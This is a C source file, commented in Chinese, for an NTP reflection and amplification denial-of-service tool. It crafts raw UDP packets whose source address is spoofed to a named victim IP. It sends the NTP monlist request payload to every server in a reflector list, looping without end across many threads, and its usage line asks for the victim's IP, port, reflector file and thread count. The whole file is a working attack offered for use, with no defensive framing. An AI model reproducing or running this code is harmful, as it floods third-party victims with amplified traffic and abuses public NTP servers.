//
// Created by wu on 2019-12-18.
//Demo:
// ./send_ntp 104.128.85.213 45678 80.186.169.160 123
//
#include <stdio.h>
#include <netinet/ip.h>//Provides declarations for ip header
#include <netinet/udp.h>//Provides declarations for udp header
#include <arpa/inet.h>
#include <stdlib.h> //for exit(0);
#include <string.h> //memset,memcpy
#include <time.h>
#include <pthread.h>

//needed for checksum calculation
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_or_tcp_length;
};

//checksum is 16bit,should use unsigned short
static unsigned short calculate_checkcsum(unsigned short *ptr, int pktlen) {
    register uint32_t csum = 0;

    //add 2 bytes / 16 bits at a time!!
    while (pktlen > 1) {
        csum += *ptr++;
        pktlen -= 2;
    }

    //add the last byte if present
    if (pktlen == 1) {
        csum += *(uint8_t *) ptr;
    }

    //add the carries
    csum = (csum >> 16) + (csum & 0xffff);
    csum = csum + (csum >> 16);

    //return the one's compliment of calculated sum
    return ((short) ~csum);
}

unsigned short victim_port = 0;
unsigned int victim_inet_addr = 0;
int is_random_victim_port = -1; //-1 is false,otherwise true;
int thread_count = 0;
char *reflect_file = NULL;
unsigned int ip_list_size = 0;

void send_ntp(in_addr_t ip_list[]) {
    // 随机数种子
//    srand((unsigned int) time(0));
    int cur_index = abs((int) random()) % ip_list_size;

    // 创建一个可以构造首部数据的 raw_socket
    int send_socket = -1;
    int one = 1;
    const int *val = &one;
    if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        printf("创建socket失败\n");
        exit(1);
    }
    if (setsockopt(send_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        printf("setsockopt 失败\n");
        exit(1);
    }

    // 根据指定 ip 和端口，发送UDP包
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(123);
//    dest.sin_addr.s_addr = victim_inet_addr;


    //这里是8个字节，用strlen()函数的时候，遇到"\x00"会截止，所有strlen(payload_data)返回1
    //所以下面的payload_size应该强制置为8
    char *payload_data = "\x17\x00\x03\x2a\x00\x00\x00\x00";

    int iphdr_size = sizeof(struct iphdr);
    int udphdr_size = sizeof(struct udphdr);
    int payload_size = 8;
    int datagram_size = iphdr_size + udphdr_size + payload_size;
    int pseudohdr_size = sizeof(struct pseudo_header);

    // udp-datagram packet.size
    char datagram[datagram_size];
    bzero(datagram, sizeof(datagram));

    // 将 ip 首部指针和 udp 首部指针指向各自的位置，
    struct iphdr *ip_header = (struct iphdr *) datagram;
    struct udphdr *udp_header = (struct udphdr *) (datagram + iphdr_size);

    //借助伪头部计算 udp 校验和
    //伪头部的大小：伪首部（8个字节）+udp首部（20个字节）+数据
    const int psize = pseudohdr_size + udphdr_size + payload_size;
    char *pseudogram = malloc(psize);
    bzero(pseudogram, sizeof(pseudogram));
    struct pseudo_header *psh = (struct pseudo_header *) pseudogram;

    int j = 0;
    for (;;) {
        dest.sin_addr.s_addr = ip_list[cur_index];

//        char datagram[datagram_size];
        bzero(datagram, sizeof(datagram));

        // 将 ip 首部指针和 udp 首部指针指向各自的位置，
//        struct iphdr *ip_header = (struct iphdr *) datagram;
//        struct udphdr *udp_header = (struct udphdr *) (datagram + iphdr_size);
        //data赋值在udp header后面
        if (payload_data != NULL) {
            strcpy(datagram + iphdr_size + udphdr_size, payload_data);
        }

        // 填充 ip 首部字段
        ip_header->ihl = 5;                     //普通 IP 数据报
        ip_header->version = 4;                 //IPv4
        ip_header->tos = 0;
        ip_header->tot_len = htons(datagram_size);
        ip_header->id = 0;                      //自定 IP 包标识，方便筛选
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;                      //指定承载的是 UDP 数据包
        ip_header->check = 0;                                //之后需要计算校验和
        ip_header->saddr = victim_inet_addr;
        ip_header->daddr = ip_list[cur_index];

        //计算 ip 校验和，结果为两个字节
        ip_header->check = calculate_checkcsum((unsigned short *) datagram, datagram_size);

        // 填充 udp 首部字段
        if (is_random_victim_port > 0) {
            victim_port = (unsigned short) (abs((int) random()) % 40000 + 20000);
        }
        udp_header->source = htons(victim_port);   //htons means host to network short
        udp_header->dest = htons(123);     //if spec value < 255(8bit) , there is no need to use htons
        udp_header->len = htons(udphdr_size + payload_size);
        udp_header->check = 0;                  //之后需要计算校验和


        //借助伪头部计算 udp 校验和
        //伪头部的大小：伪首部（8个字节）+udp首部（20个字节）+数据
//        const int psize = pseudohdr_size + udphdr_size + payload_size;
//        char *pseudogram = malloc(psize);
        bzero(pseudogram, sizeof(pseudogram));

//        struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
        psh->source_address = victim_inet_addr;
        psh->dest_address = ip_list[cur_index];
        psh->placeholder = 0;
        psh->protocol = IPPROTO_UDP;
        psh->udp_or_tcp_length = htons(udphdr_size + payload_size);

        memcpy(pseudogram + pseudohdr_size, udp_header, udphdr_size + payload_size);

        //计算 udp 校验和
        udp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);

        //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑


        ssize_t bytes_sent = sendto(
                send_socket, datagram, datagram_size,
                0, (struct sockaddr *) &dest, sizeof(dest)
        );

        if (bytes_sent < 0) {
            perror("Send datagram fail");
        }

        cur_index++;
        if (cur_index == ip_list_size) {
            cur_index = 0;
        }
    }
}

unsigned int get_file_line_count(char *filename) {
    FILE *fp = fopen(filename, "r");
    if (fp == NULL) {
        printf("read reflect file failed!\n");
        exit(1);
    }

    char buff[4096];
    unsigned int line_count = 0;
    for (;;) {
        if (fgets(buff, 4096, fp) == NULL) {
            break;
        }
        line_count++;
    }
    fclose(fp);

    return line_count;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("usage:./<script name> <victim ip> <victim port,-1 for random> <reflect file> <thread count>\n");
        exit(1);
    }

    int i;
    for (i = 1; i < argc; i++) {
        if (i == 1) {
            printf("victim_ip = %s\n", argv[i]);
            victim_inet_addr = inet_addr(argv[i]);
            continue;
        }
        if (i == 2) {
            int port = atoi(argv[i]);
            if (port < 0) {
                is_random_victim_port = 1;
                printf("victim_port is random\n");
            } else {
                is_random_victim_port = -1;
                victim_port = (unsigned short) port;
                printf("victim_port = %d\n", victim_port);
            }
            continue;
        }
        if (i == 3) {
            printf("reflect_file = %s\n", argv[i]);
            reflect_file = argv[i];
            continue;
        }
        if (i == 4) {
            thread_count = atoi(argv[i]);
            printf("thread_count = %d\n", thread_count);
            continue;
        }
    }

    unsigned int line_count = get_file_line_count(reflect_file);
    ip_list_size = line_count;
    printf("\n一共有%d行ip地址\n", line_count);

    in_addr_t ip_list[line_count];
    bzero(ip_list, line_count);

    //根据反射文件生成一个ip list
    FILE *fp = fopen(reflect_file, "r");
    if (fp == NULL) {
        printf("read reflect file failed!\n");
        exit(1);
    }
    char buff[4096];
    int j;
    for (j = 0; j < line_count; j++) {
        if (fgets(buff, 4096, fp) == NULL) {
            break;
        }
        ip_list[j] = inet_addr(buff);
    }
    fclose(fp);


    //start multi thread
    pthread_t tids[thread_count];
    int k;
    for (k = 0; k < thread_count; k++) {
        //第一个参数tid，第二个参数线程param，一般传NULL，第三个参数，方法指针，第四个参数，方法的参数列表，如果没有参数就传NULL
        pthread_create(&tids[k], NULL, (void *) send_ntp, (void *) ip_list);
    }
    for (k = 0; k < thread_count; k++) {
        pthread_join(tids[k], NULL);
    }

    // sockfd should close here !
    return 0;
}
